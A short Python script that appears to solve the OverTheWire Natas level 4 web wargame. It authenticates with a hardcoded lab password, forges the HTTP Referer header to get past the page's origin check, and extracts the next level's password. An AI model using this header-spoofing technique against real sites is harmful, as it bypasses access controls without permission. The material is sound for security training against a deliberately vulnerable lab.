import requests
import re

def flag(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    link = re.findall('only from "(.*)"',site.text)
    referer = {
            "Referer":link[0].strip()
            }
    refered_url = requests.get(url,auth=(username,password),headers=referer)
    flag = re.findall("password for natas5 is(.*)",refered_url.text)
    print("The flag for natas4 is: " + flag[0].strip())

if __name__=="__main__":
    url = "http://natas4.natas.labs.overthewire.org/"
    username = "natas4"
    password = "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm"
    flag(url,username,password)
